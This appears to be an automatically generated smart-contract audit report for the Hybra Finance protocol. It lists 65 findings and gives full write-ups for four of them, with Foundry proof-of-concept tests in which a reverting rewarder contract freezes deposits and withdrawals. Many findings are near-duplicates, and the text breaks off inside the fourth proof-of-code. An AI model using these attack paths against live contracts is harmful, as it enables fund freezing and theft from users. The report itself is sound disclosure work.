# 2025 10 hybra finance - Findings Report
## Commit hash: 6299bfbc089158221e5c645d4aaceceea474f5be

##Findings by Pattern


 **Derived From** : Untrusted rewarder callback can revert and DoS deposit/withdraw/harvest

[M-1]. GaugeV2 unguarded rewarder callback lets misconfigured/malicious rewarder brick deposits and withdrawals



 **Derived From** : Rewarder hook can revert and brick deposit/withdraw/harvest (no try/catch)

[M-2]. GaugeV2’s untrusted rewarder hook can revert and permanently DoS deposits, withdrawals, and harvests
[M-3]. GaugeV2 rewarder callback can brick deposits and freeze withdrawals/harvests (no try/catch)



 **Derived From** : Let g = gauges[pool]. Then g != 0 && poolForGauge[g] == pool && isGauge[g] == true && isAlive[g] == true && pools[pools.length-1] == pool && internal_bribes[g] != 0 && external_bribes[g] != 0

[M-4]. Bribe endpoint rotation desynchronizes GaugeManager mappings from Gauge contract, blackholing fees and bribes



 **Derived From** : Per-user append-only lock array can bloat storage and DoS transfers

[M-5]. GrowthHYBR userLocks[] grows unbounded; expired-lock cleanup in _beforeTokenTransfer can gas-DoS sender transfers



 **Derived From** : Untrusted Rewarder callback can revert and brick deposit/withdraw/harvest

[M-6]. GaugeV2 DoS: unguarded gaugeRewarder.onReward revert blocks deposit, withdraw, and harvest
[M-7]. GaugeV2: Malicious or misconfigured rewarder can revert in onReward and DoS deposits, withdrawals, and harvests



 **Derived From** : Fee-on-transfer assumptions in emissions/fees cause mis-accounting or DoS

[H-8]. GaugeCL.claimFees sweeps entire token0/token1 balances (not deltas), draining HYBR emissions when pool includes HYBR



 **Derived From** : forall state-mutating calls: require(msg.sender == factory.swapFeeManager()); additionally, where applicable, require(factory.isPool(_pool))

[H-9]. Fee discount privilege leaks via tx.origin in DynamicSwapFeeModule.getFee allowing arbitrary contracts to piggyback a discounted EOA



 **Derived From** : ownership_change[tokenId] == block.number => balanceOfNFT(tokenId) == 0

[M-10]. Same-block transfer protection can be bypassed via split: mint new child NFTs without ownership_change and vote immediately
[M-11]. DAO voting path ignores same-block zero: getVotes/getPastVotes compute weight without ownership_change guard
[M-12]. Same-block transfer protection can be bypassed via merge: migrate weight into an existing token and vote immediately



 **Derived From** : Untrusted rewarder hook can brick deposit/withdraw/harvest (no try/catch)

[M-13]. GaugeV2’s unguarded rewarder hook can revert and brick deposits, withdrawals, and harvests



 **Derived From** : _periodFinish == HybraTimeLibrary.epochNext(block.timestamp) && rewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] == rewardRate

[H-14]. Post-epoch streaming leak: GaugeCL streams rollover rewards after periodFinish before new notify
[M-15]. Epoch-end notify creates 1-second emission spike enabling MEV ‘flash-stake’ to steal a full epoch’s rewards



 **Derived From** : Anyone can force-compound HYBR into ve via unguarded receivePenaltyReward

[M-16]. Permissionless receivePenaltyReward() lets anyone init veNFT and brick compound() via SafeERC20 approval invariant



 **Derived From** : Per-gauge epoch gating: After a successful distribution for gauge G at epochStart E, any further distribute calls in the same epoch do not change state (gaugesDistributionTimestmap[G] stays == E and base balance unchanged)

[M-17]. Epoch-gated single-shot distribution is MEV: attacker front-runs distribute() and reweights votes to divert the whole epoch’s emissions
[H-18]. Epoch-gated single distribution samples live weights at call-time, enabling JIT vote flipping to siphon full epoch emissions



 **Derived From** : EIP-712 domain encoding mismatch in delegateBySig (non-standard; signature breakage)

[M-19]. VotingEscrow.delegateBySig uses non-standard EIP-712 domain (adds version not in typehash), breaking signature verification



 **Derived From** : Append-only pools array causes storage bloat and long-term gas inflation

[L-20]. Permissionless CL gauge creation bloats pools[] without pruning, making distributeAll/distributeFees O(n) and eventually hitting block gas limit



 **Derived From** : Epoch share uses live weights enabling last-minute vote sniping of emissions

[H-21]. Emissions can be redirected by vote-sniping: GaugeManager uses live weights at distribution time instead of epoch snapshot
[M-22]. Live weight reads in GaugeManager._updateForAfterDistribution allow same-tx vote sniping to redirect weekly emissions



 **Derived From** : Direct NFT transfers to GaugeCL get stuck (unconditional ERC721Receiver acceptance)

[L-23]. GaugeCL.onERC721Received unconditionally accepts NFTs; direct safeTransferFrom bricks position and withdraw() reverts



 **Derived From** : Fee veNFT can be sent to zero address if Team not set, permanently burning fees

[M-24]. GrowthHYBR.withdraw sends fee veNFT to address(0) when Team unset, burning protocol fees



 **Derived From** : ownership_change[_tokenId] == block.number => balanceOfNFT(_tokenId) == 0

[M-25]. Flash-vote protection bypass: in-block merge/multiSplit restores voting power despite same-block transfer



 **Derived From** : calculate_rebase(_weeklyMint) <= (_weeklyMint * REBASEMAX) / MAX_BPS and calculate_rebase(_weeklyMint) <= _weeklyMint

[H-26]. Anyone can inflate rebase by donating HYBR to VotingEscrow, siphoning weekly emissions from gauges to ve holders up to REBASEMAX



 **Derived From** : Fee module callbacks can grief by returning malformed data causing decode revert

[L-27]. Griefable fee-module response lets abi.decode revert in CLFactory.getSwapFee/Unstaked/ProtocolFee, bricking CLPool fee() and swaps
[M-28]. External fee module can return short data to brick CLFactory.getSwapFee/getUnstakedFee/getProtocolFee and DoS all swaps/flash



 **Derived From** : Emission accounting mismatch (no epoch snapshot) can break conservation and DoS payouts

[M-29]. GaugeManager distribution uses live weights while index minted on old totalWeight, enabling DoS and emission drift
[M-30]. GaugeManager distributes using live weights after index mint, allowing per-gauge claimable > minted and reverting distributions



 **Derived From** : Permissionless gauge creation allows arbitrary CL pools and pools[] spam (no factory check)

[M-31]. DoS via permissionless CL gauge creation: arbitrary pools registered and pushed into pools[], bloating distribution loops



 **Derived From** : post.lastUpdated >= pre.lastUpdated && post.lastUpdated <= block.timestamp

[M-32]. CLPool rewards ignore periodFinish: anyone can trigger accrual past expiry via swap/updateRewardsGrowthGlobal



 **Derived From** : collectFees returns 1 wei without transferring (sentinel misreport)

[L-33]. CLPool.collectFees misreports 1 wei collected due to sentinel, returning non-zero with zero transfer



 **Derived From** : (usedWeights[tokenId] > 0) => VotingEscrow(_ve).voted(tokenId) == true after vote; after reset(tokenId): VotingEscrow(_ve).voted(tokenId) == false

[M-34]. Zero-weight vote leaves veNFT ‘voted’ latch stuck true, blocking withdraw/transfer until next epoch



 **Derived From** : Tail emission uses totalSupply instead of circulating supply, causing over‑minting

[M-35]. Over-minting in MinterUpgradeable.weekly_emission due to tail floor using totalSupply rather than circulating supply



 **Derived From** : nonfungiblePositionManager.ownerOf(tokenId) == address(this) && lastUpdateTime[tokenId] == block.timestamp && this.earned(tokenId) == 0

[H-36]. JIT stake in GaugeCL.deposit captures pre-update emissions due to lazy global update and pre-update snapshot



 **Derived From** : internal_bribes[_gauge]_post == _internal AND _internal.code.length > 0

[L-37]. setInternalBribeFor breaks cross-contract sync: GaugeManager mapping diverges from Gauge’s internal_bribe, causing bribe/fees routing DoS



 **Derived From** : Let dt = _blockTimestamp() - pre.lastUpdated (mod 2^32). Then: post.lastUpdated >= pre.lastUpdated; If dt == 0 or pre.rewardReserve == 0: no state change. Else let r = min(pre.rewardRate * dt, pre.rewardReserve). Then post.rewardReserve = pre.rewardReserve - r AND (if pre.stakedLiquidity > 0 then post.rewardGrowthGlobalX128 = pre.rewardGrowthGlobalX128 + floor(r * 2^128 / pre.stakedLiquidity) and post.rollover = pre.rollover; else post.rollover = pre.rollover + r and post.rewardGrowthGlobalX128 = pre.rewardGrowthGlobalX128).

[M-38]. Epoch boundary backdating: syncReward rewinds time and misprices accrued rewards at the new rate



 **Derived From** : IVotes/EIP-712 deviations: getPastVotes uses timestamp and domain typehash mismatch

[M-39]. IVotes snapshot functions accept blockNumber but use timestamp, breaking block-based governance snapshots



 **Derived From** : CL gauge creation bypasses pool authenticity checks (any contract can be gauged)

[M-40]. Permissionless creation of CL gauges for arbitrary contracts enables emission sink and untrusted external calls
[M-41]. Registry pollution via fake CL pools leads to unbounded pools[] growth and operational DoS



 **Derived From** : For each pool in poolVote[tokenId] after the call: votes[tokenId][pool] > 0 and gaugeManager.isGaugeAliveForPool(pool) == true at vote time

[M-42]. Bribe pointer rotation breaks Voter↔Bribe referential integrity: reset withdraws from new bribes, leaving old bribes credited and enabling double accrual



 **Derived From** : Permissionless CL gauge creation accepts arbitrary fake pools (isPair bypass)

[M-43]. Permissionless CL gauge creation bypasses pool validation for CL (gaugeType=1), allowing arbitrary fake pools to be registered and bloating pools[]



 **Derived From** : Maturity lock is never set; withdraw lock effectively bypassed

[M-44]. Uninitialized maturityTime lets users instantly withdraw, bypassing intended lock in GaugeV2._withdraw



 **Derived From** : idToOwner[_tid] == owner && tokenOfOwnerByIndex(owner, tokenToOwnerIndex[_tid]) == _tid for all existing tokenIds; ownerToNFTokenCount[owner] equals number of indices [0..ownerToNFTokenCount[owner]-1] where ownerToNFTokenIdList[owner][i] != 0

[H-45]. Transfer to zero address corrupts owner-index tables and bricks veNFT (permanent fund loss)



 **Derived From** : Emergency withdraw mutates supply without updating reward index (skews emissions)

[H-46]. GaugeV2 emergency withdrawals don’t checkpoint rewards, inflating rewardPerToken and stealing matured emissions from leavers



 **Derived From** : getProtocolFee directly calls gaugeManager without safe fallback; reverting manager bricks fee path

[M-47]. Griefable external call in CLFactory.getProtocolFee lets gaugeManager DoS CLPool swaps/flash



 **Derived From** : Rebase + team share can exceed emission and revert, halting weekly distributions

[M-48]. Emission split underflows in MinterUpgradeable.update_period() when REBASEMAX + teamRate > 100% (DoS of weekly emissions)



 **Derived From** : _teamEmissions + _rebase + _gauge == _emission

[M-49]. Division-by-zero in calculate_rebase when HYBR totalSupply == 0 bricks update_period



 **Derived From** : Append-only allPools array causes storage bloat and degrades fee collection over time

[M-50]. Gas grief: permissionless pool spam bloats CLFactory.allPools → collectAllProtocolFees becomes impractical/DoS over time



 **Derived From** : createPool allows zero/incorrect gaugeManager, permanently bricking gauge setup

[M-51]. Anyone can front‑run CLFactory.createPool before gaugeManager is set and permanently brick gauge attachment for that pair/spacing



 **Derived From** : rHYBR external call in withdraw can brick withdrawals (no fallback)

[H-52]. GaugeCL.withdraw is griefable: untrusted rHYBR callback can DoS NFT exits (no try/catch, no skip-claim path)



 **Derived From** : After withdraw(tokenId, redeemType) by the staker: nonfungiblePositionManager.ownerOf(tokenId) == msg.sender

[M-53]. GaugeCL.withdraw can permanently lock staked NFPM NFTs for contract stakers that are not ERC721 receivers



 **Derived From** : Emergency withdraw skips reward index update; rewards misaccounting possible

[M-54]. GaugeV2 emergencyWithdraw paths let remaining stakers steal past emissions by skipping reward checkpointing



 **Derived From** : Emergency withdraw fails to sync sidecar rewarder (power/rewards not revoked)

[M-55]. GaugeV2.emergencyWithdraw fails to call rewarder.onReward, allowing users to keep delegated balance and farm external rewards after pulling LP



 **Derived From** : Emergency withdrawals bypass reward checkpointing, breaking rewards accounting

[M-56]. GaugeV2.emergencyWithdraw[Amount] skips updateReward, burning users’ accrued emissions and stranding rewards in the gauge



 **Derived From** : lastVoted[tokenId] == HybraTimeLibrary.epochStart(lastVotedTimestamp[tokenId]) + 1

[M-57]. Bribe sniping: end-of-epoch votes capture full-epoch bribes due to missing vote-end window in VoterV3.vote



 **Derived From** : forall pool in poolVote[_tokenId]: votes[_tokenId][pool] > 0 && gaugeManager.isGaugeAliveForPool(pool) == true && allDistinct(poolVote[_tokenId])

[M-58]. Bribe rotation breaks poolVote referential integrity: reset/poke withdraws from wrong bribe, leaving stale deposits and enabling double-claim windows



 **Derived From** : Shares are under-minted due to using post-deposit assets in share calc (systematic value leak)

[H-59]. GrowthHYBR.deposit mints too few shares by using post-deposit totalAssets, letting existing holders siphon value from new depositors



 **Derived From** : totalAssets_after >= totalAssets_before && totalSupply_after == totalSupply_before

[H-60]. Pre-compound deposits mint too many shares by ignoring pending HYBR, stealing value when compound raises PPS



 **Derived From** : Dynamic fee bypass via factory cap mismatch (returns >100k → fallback to cheap base fee)

[H-61]. Volatility-based dynamic fee can be bypassed: CLFactory rejects >10% fee and silently falls back to cheap default



 **Derived From** : For the same pool p and chain state: if discounted[u]>0 and discounted[v]==0, then calling getFee(p) from u (as tx.origin) returns a value <= calling getFee(p) from v; also 0 <= discounted[u] <= MAX_DISCOUNT

[M-62]. Discounted tx.origin can pay higher effective fee than non-discounted due to CLFactory.getSwapFee clamp, violating monotonic discount invariant



 **Derived From** : poke() can leave veNFT stuck in voted state when new weight == 0 (no abstain call)

[M-63]. VoterV3.poke leaves veNFT stuck in voted=true when all prior gauges are dead, DoSing transfer/withdraw until next epoch



 **Derived From** : on success of vote(tokenId,...): lastVoted[tokenId] == HybraTimeLibrary.epochStart(block.timestamp) + 1 && lastVotedTimestamp[tokenId] == block.timestamp && calling vote(tokenId,...) again in the same epoch reverts with 'VOTED' && calling vote/reset when block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp) reverts with 'DW' && calling poke when block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp) reverts with 'DW'

[H-64]. End-of-epoch poke allows bribe sniping: missing no-vote end window lets attacker resize votes just before rollover



 **Derived From** : usedWeights[tokenId] == sum_{i in [0..poolVote[tokenId].length-1]} votes[tokenId][poolVote[tokenId][i]] && usedWeights[tokenId] <= IVotingEscrow(_ve).balanceOfNFT(tokenId)

[M-65]. Rounding-to-zero in VoterV3.poke/vote causes epoch-long DoS on veNFT when voting power shrinks


### Number of Findings
- C: 0
- H: 14
- M: 46
- L: 5
- I: 0

##Findings by Pattern


 **Derived From** : Untrusted rewarder callback can revert and DoS deposit/withdraw/harvest

## [M-1]. GaugeV2 unguarded rewarder callback lets misconfigured/malicious rewarder brick deposits and withdrawals

## Derived From Pattern/Invariant
Untrusted rewarder callback can revert and DoS deposit/withdraw/harvest

## Exploit Type
Dos

## Location
GaugeV2.deposit/withdraw/getReward

## Minimim Privilege Required
RequireAdminRole

## Description
GaugeV2 calls an external gaugeRewarder hook in all hot paths without try/catch. Any revert in the hook fully reverts deposit(), withdraw(), and getReward(), allowing a misconfigured or malicious rewarder to DoS core liveness and lock user funds until governance intervenes. Vulnerable snippets:

- deposit/_withdraw:
  if (address(gaugeRewarder) != address(0)) {
      IRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account));
  }

- getReward (both overloads):
  if (gaugeRewarder != address(0)) {
      IRewarder(gaugeRewarder).onReward(...)
  }

## Impact
Functional DoS: Users cannot deposit, harvest or withdraw (funds stuck) if rewarder reverts. Requires owner to fix or activate emergency mode.

## Proof of Concept
1) User deposits LP into GaugeV2 when gaugeRewarder is unset (works). 2) Owner sets gaugeRewarder to a rewarder whose onReward() reverts. 3) User attempts withdraw; withdraw() hits onReward() and reverts, leaving funds stuck. 4) Any new deposit or getReward() also reverts as long as the bad rewarder is set.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeV2, IRewarder} from "../contracts/GaugeV2.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n,string memory s){name=n;symbol=s;}
    function mint(address to,uint256 amt) external { balanceOf[to]+=amt; }
    function approve(address sp,uint256 amt) external returns(bool){ allowance[msg.sender][sp]=amt; return true; }
    function transfer(address to,uint256 amt) external returns(bool){ require(balanceOf[msg.sender]>=amt,"bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address f,address t,uint256 amt) external returns(bool){ uint256 a=allowance[f][msg.sender]; require(a>=amt && balanceOf[f]>=amt,"allow/bal"); allowance[f][msg.sender]=a-amt; balanceOf[f]-=amt; balanceOf[t]+=amt; return true; }
}

contract RevertingRewarder is IRewarder {
    function onReward(address, address, uint256) external pure { revert("rewarder revert"); }
}

contract GaugeV2_GriefableCallbacks_Test is Test {
    GaugeV2 gauge;
    MockERC20 reward; MockERC20 lp;
    address owner; address attacker; address dist;

    function setUp() public {
        owner = address(this);
        attacker = address(0xbabe);
        dist = address(0xd155);
        reward = new MockERC20("RWD","RWD");
        lp = new MockERC20("LP","LP");
        // rHYBR, VE, bribes can be dummies; isForPair=false
        gauge = new GaugeV2(address(reward), address(0xbeef), address(0xdead), address(lp), dist, address(0), address(0), false);
        // fund attacker with LP
        lp.mint(attacker, 100e18);
        vm.prank(attacker);
        lp.approve(address(gauge), type(uint256).max);
    }

    function test_DepositThenDOSWithdrawViaRevertingRewarder() public {
        // 1) Deposit succeeds while rewarder unset
        vm.prank(attacker);
        gauge.deposit(100e18);
        assertEq(gauge.balanceOf(attacker), 100e18, "deposit balance");
        assertEq(lp.balanceOf(address(gauge)), 100e18, "gauge holds LP");

        // 2) Owner sets malicious rewarder
        RevertingRewarder bad = new RevertingRewarder();
        gauge.setGaugeRewarder(address(bad));

        // 3) Withdraw reverts due to rewarder callback
        vm.startPrank(attacker);
        vm.expectRevert(bytes("rewarder revert"));
        gauge.withdraw(1e18);
        vm.stopPrank();

        // 4) New deposits also revert
        vm.prank(attacker);
        vm.expectRevert(bytes("rewarder revert"));
        gauge.deposit(1e18);

        // Funds remain stuck in gauge
        assertEq(lp.balanceOf(address(gauge)), 100e18, "LP stuck in gauge");
    }
}


## Suggested Mitigation
Wrap the external callback in try/catch to soft-fail instead of reverting. Example:

if (gaugeRewarder != address(0)) {
    try IRewarder(gaugeRewarder).onReward(user, recipient, _balanceOf(user)) {} catch {} 
}

Optionally add a kill-switch flag to bypass the rewarder, or validate rewarder via handshake and allow only audited implementations.





 **Derived From** : Rewarder hook can revert and brick deposit/withdraw/harvest (no try/catch)

## [M-2]. GaugeV2’s untrusted rewarder hook can revert and permanently DoS deposits, withdrawals, and harvests

## Derived From Pattern/Invariant
Rewarder hook can revert and brick deposit/withdraw/harvest (no try/catch)

## Exploit Type
Dos

## Location
GaugeV2._deposit / _withdraw / getReward

## Minimim Privilege Required
RequireAdminRole

## Description
GaugeV2 calls an external, untrusted rewarder in core user flows without try/catch or fallback. Any revert in the rewarder bricks the entire action, impacting liveness and potentially trapping user funds until governance intervenes. Vulnerable calls exist in deposit, withdraw, and harvest paths:

// deposit
if (address(gaugeRewarder) != address(0)) {
    IRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account));
}

// withdraw
if (address(gaugeRewarder) != address(0)) {
    IRewarder(gaugeRewarder).onReward(msg.sender, msg.sender, _balanceOf(msg.sender));
}

// harvest
if (gaugeRewarder != address(0)) {
    IRewarder(gaugeRewarder).onReward(_user, _user, _balanceOf(_user));
}

A malicious/misconfigured rewarder (or one that later upgrades to revert) breaks deposits, withdrawals, and getReward for all users. There is no bypass, no best-effort path, and no try/catch to isolate the failure.

## Impact
If the owner-configured gaugeRewarder reverts in onReward, all core user flows that invoke it (deposit, withdraw, getReward) revert. This causes full liveness loss for the gauge’s normal operations and can effectively trap funds until the owner intervenes (either by swapping out the rewarder or enabling emergencyWithdraw). While assets are not directly stolen, availability and UX are severely impacted, and withdrawals require centralized action to recover.

## Proof of Concept
Attack outline:
1) Owner sets gaugeRewarder to a contract whose onReward always reverts.
2) Any user calling deposit(amount) reverts before the token transferFrom, blocking new deposits.
3) If users already deposited, later switching to a reverting rewarder makes withdraw(amount) revert, trapping funds until owner action (change rewarder or activate emergency mode).
4) getReward() also reverts due to the same hook, breaking harvesting for users and Distribution flows.
There is no try/catch or bypass in these paths, so a single reverting hook blocks all users.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeV2, IRewarder} from "contracts/GaugeV2.sol";

contract RevertingRewarder is IRewarder {
    function onReward(address, address, uint256) external pure override {
        revert("rewarder-revert");
    }
}

contract MockERC20 {
    string public name = "MOCK";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract GaugeV2_RewarderHook_DoSTest is Test {
    GaugeV2 gauge;
    MockERC20 lp;
    MockERC20 reward;
    address user = address(0xBEEF);
    RevertingRewarder revertRewarder;

    function setUp() public {
        lp = new MockERC20();
        reward = new MockERC20();
        gauge = new GaugeV2(
            address(reward),            // rewardToken
            address(0xdead),            // rHYBR (unused in tests as reward==0)
            address(0xcafe),            // VE (unused)
            address(lp),                // TOKEN (LP)
            address(this),              // DISTRIBUTION
            address(0),
            address(0),
            false
        );
        revertRewarder = new RevertingRewarder();
        // fund user and approve
        lp.mint(user, 100 ether);
        vm.prank(user);
        lp.approve(address(gauge), type(uint256).max);
    }

    function test_DepositBlockedWhenRewarderReverts() public {
        // set reverting rewarder
        gauge.setGaugeRewarder(address(revertRewarder));
        uint256 userBalBefore = lp.balanceOf(user);
        uint256 tsBefore = gauge.totalSupply();

        vm.startPrank(user);
        vm.expectRevert();
        gauge.deposit(1 ether);
        vm.stopPrank();

        // balances unchanged because deposit reverts before transferFrom
        assertEq(lp.balanceOf(user), userBalBefore, "user LP balance changed");
        assertEq(gauge.totalSupply(), tsBefore, "gauge supply changed");
    }

    function test_WithdrawBlockedWhenRewarderReverts() public {
        // deposit succeeds when no rewarder set
        vm.prank(user);
        gauge.deposit(1 ether);
        assertEq(gauge.totalSupply(), 1 ether, "deposit failed");
        assertEq(lp.balanceOf(address(gauge)), 1 ether, "gauge LP balance incorrect");

        // later owner sets reverting rewarder => withdraw DoS
        gauge.setGaugeRewarder(address(revertRewarder));

        uint256 userBalBefore = lp.balanceOf(user);
        vm.startPrank(user);
        vm.expectRevert();
        gauge.withdraw(1 ether);
        vm.stopPrank();

        // funds remain locked in gauge until owner intervenes
        assertEq(lp.balanceOf(user), userBalBefore, "user LP unexpectedly changed");
        assertEq(lp.balanceOf(address(gauge)), 1 ether, "gauge LP unexpectedly changed");
    }

    function test_GetRewardBlockedWhenRewarderReverts() public {
        // user deposits once (no emissions so reward==0 but hook still runs)
        vm.prank(user);
        gauge.deposit(1 ether);

        gauge.setGaugeRewarder(address(revertRewarder));

        vm.startPrank(user);
        vm.expectRevert();
        gauge.getReward(0);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Make the rewarder hook best-effort and non-blocking:
- Wrap onReward in try/catch everywhere it is called and swallow failures (emit an event like RewarderHookFailed(user) for observability). Example:
  if (gaugeRewarder != address(0)) { try IRewarder(gaugeRewarder).onReward(user, user, _balanceOf(user)) {} catch {} }
- Additionally, on withdraw, place the hook after completing the token transfer to ensure exits cannot be blocked even if the hook reverts. On deposit, consider calling the hook after a successful transferFrom as well.
- Optionally add an owner-controlled toggle to disable the hook (or auto-disable on repeated failures) and/or a withdraw-only bypass path so users can always exit without requiring emergency mode.
These changes fully isolate untrusted rewarder failures from core gauge liveness.


## [M-3]. GaugeV2 rewarder callback can brick deposits and freeze withdrawals/harvests (no try/catch)

## Derived From Pattern/Invariant
Rewarder hook can revert and brick deposit/withdraw/harvest (no try/catch)

## Exploit Type
Dos

## Location
GaugeV2.multiple (_deposit, _withdraw, getReward)

## Minimim Privilege Required
RequireAdminRole

## Description
GaugeV2 synchronously calls an external, untrusted rewarder in its core paths without try/catch or any fallback. A misconfigured, malicious, or later-upgraded rewarder can revert and propagate the revert, DoSing deposits, withdrawals, and harvests for all users. Vulnerable snippets:

// deposit path
if (address(gaugeRewarder) != address(0)) {
    IRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account));
}

// withdraw path
if (address(gaugeRewarder) != address(0)) {
    IRewarder(gaugeRewarder).onReward(msg.sender, msg.sender, _balanceOf(msg.sender));
}

// harvest path
if (gaugeRewarder != address(0)) {
    IRewarder(gaugeRewarder).onReward(_user, _user, _balanceOf(_user));
}

Because these calls are in critical flows and not guarded with try/catch, any revert from the rewarder bricks user liveness (including withdrawals), effectively freezing funds until an owner intervenes (e.g., toggling emergency or replacing the rewarder).

## Impact
Functional DoS of deposits, withdrawals, and harvests. Users can be unable to withdraw their staked LPs and unable to claim rewards; protocol liveness relies on admin intervention to recover.

## Proof of Concept
1) Alice deposits when no rewarder is set (succeeds).
2) Owner sets gaugeRewarder to a reverting contract.
3) Alice’s withdrawAll() now reverts due to the rewarder callback; funds are stuck.
4) getReward() (even with zero rewards) also reverts due to the callback.
5) New deposits are bricked while the reverting rewarder remains configured.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeV2} from "contracts/GaugeV2.sol";
import {HYBR} from "contracts/HYBR.sol";

contract RevertingRewarder {
    function onReward(address, address, uint256) external pure {
        revert("rewarder-revert");
    }
}

contract GaugeV2_GriefableCallbacksTest is Test {
    HYBR underlying;
    HYBR rewardToken;
    GaugeV2 gauge;
    address alice = address(0xA11CE);

    function setUp() public {
        // Deploy simple ERC20s for underlying and reward token
        underlying = new HYBR();
        rewardToken = new HYBR();

        // Deploy GaugeV2 (rHYBR/VE not needed for this test; DISTRIBUTION unused here)
        gauge = new GaugeV2(
            address(rewardToken),
            address(0xdead), // rHYBR (unused because reward = 0 in this test)
            address(0xbeef), // VE
            address(underlying),
            address(0xBEEF1), // DISTRIBUTION
            address(0),       // internal_bribe
            address(0),       // external_bribe
            false             // isForPair
        );

        // Mint underlying to Alice and approve Gauge
        underlying.mint(alice, 1_000e18);
        vm.prank(alice);
        underlying.approve(address(gauge), type(uint256).max);
    }

    function test_RewarderRevertBricksWithdrawDepositAndHarvest() public {
        // 1) Deposit succeeds when no rewarder
        vm.prank(alice);
        gauge.deposit(100e18);
        assertEq(gauge.totalSupply(), 100e18, "deposit should increase totalSupply");

        // 2) Owner sets malicious reverting rewarder
        RevertingRewarder rewarder = new RevertingRewarder();
        gauge.setGaugeRewarder(address(rewarder));

        // 3) Withdraw now reverts due to rewarder callback
        vm.startPrank(alice);
        vm.expectRevert();
        gauge.withdrawAll();
        vm.stopPrank();
        assertEq(gauge.totalSupply(), 100e18, "supply unchanged after failed withdraw");

        // 4) Harvest also reverts even if no rewards accrued (reward==0)
        vm.prank(alice);
        vm.expectRevert();
        gauge.getReward(uint8(0));

        // 5) New deposits are bricked for everyone
        address bob = address(0xB0B);
        underlying.mint(bob, 50e18);
        vm.prank(bob);
        underlying.approve(address(gauge), type(uint256).max);
        vm.prank(bob);
        vm.expectRevert();
        gauge.deposit(10e18);

        // State remains as before
        assertEq(gauge.totalSupply(), 100e18, "no new deposits after rewarder reverts");
    }
}


## Suggested Mitigation
Make the rewarder hook best-effort. Wrap onReward calls in try/catch and ignore failures (or emit an event) so core flows never brick:

try IRewarder(gaugeRewarder).onReward(user, recipient, _balanceOf(user)) {} catch { emit RewarderCallFailed(gaugeRewarder, user); }

Optionally add: (1) an owner-settable flag to temporarily skip rewarder callbacks, (2) gas-limited calls, and (3) ability to unset a failing rewarder immediately. Consider calling the hook after token transfers to reduce grief surface.





 **Derived From** : Let g = gauges[pool]. Then g != 0 && poolForGauge[g] == pool && isGauge[g] == true && isAlive[g] == true && pools[pools.length-1] == pool && internal_bribes[g] != 0 && external_bribes[g] != 0

## [M-4]. Bribe endpoint rotation desynchronizes GaugeManager mappings from Gauge contract, blackholing fees and bribes

## Derived From Pattern/Invariant
Let g = gauges[pool]. Then g != 0 && poolForGauge[g] == pool && isGauge[g] == true && isAlive[g] == true && pools[pools.length-1] == pool && internal_bribes[g] != 0 && external_bribes[g] != 0

## Exploit Type
StorageLayout

## Location
GaugeManager.setNewBribes

## Minimim Privilege Required
RequiresRole

## Description
createGauge correctly sets a consistent pool↔gauge mapping and bribe endpoints. However, later rotations via GaugeManager.setNewBribes()/setInternalBribeFor()/setExternalBribeFor only update GaugeManager’s internal_bribes/external_bribes mappings and do not update the underlying Gauge’s internal_bribe pointer. As a result, the source of truth diverges: GaugeV2/GaugeCL keeps sending LP fees to the old internal bribe while GaugeManager reports the new bribe address. Front-ends and claim flows that rely on GaugeManager become inconsistent and users cannot claim from the new bribe; fees accrue in the old bribe, effectively DoS’ing claims until privileged recovery. Vulnerable snippet:

function setNewBribes(address _gauge, address _internal, address _external) external GaugeAdmin {
    require(isGauge[_gauge], "!GAUGE");
    _setInternalBribe(_gauge, _internal);  // only updates mapping
    _setExternalBribe(_gauge, _external);  // only updates mapping
}

Gauge contracts continue to use their own stored internal_bribe variable when forwarding fees (see GaugeV2._claimFees / GaugeCL._claimFees).

## Impact
GaugeManager.setNewBribes/setInternalBribeFor only mutate the manager’s internal_bribes/external_bribes mappings and never update the actual Gauge contract’s internal_bribe pointer. After rotation, fees continue to be forwarded by the Gauge to the old internal bribe, while off-chain tools or flows that consume GaugeManager mappings will attempt to claim from the new address and see zero. Funds are not lost but accrue in the old bribe and are unavailable through the newly-registered address until an admin updates the Gauge via its factory or manually migrates. This is a privileged but realistic operational path, creating functional DoS/misaccounting for bribe claims.

## Proof of Concept
1) Deploy GaugeManager and set a BribeFactory.
2) Create a V2 gauge for a mock pool using createGauge(pool, 0). Record (g, intBribe0, extBribe0).
3) Assert GaugeV2(g).internal_bribe == intBribe0 and GaugeManager.internal_bribes[g] == intBribe0.
4) GAUGE_ADMIN calls GaugeManager.setNewBribes(g, intBribe1, extBribe1) where intBribe1/extBribe1 are fresh contracts.
5) Observe divergence: GaugeV2(g).internal_bribe remains intBribe0 while GaugeManager.internal_bribes[g] becomes intBribe1.
6) Because GaugeV2.claimFees() forwards to its own internal_bribe, fees will still go to intBribe0. Any claim flow relying on GaugeManager.internal_bribes (intBribe1) will read zero.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {GaugeManager} from "contracts/GaugeManager.sol";
import {GaugeFactory} from "contracts/GaugeFactory.sol";
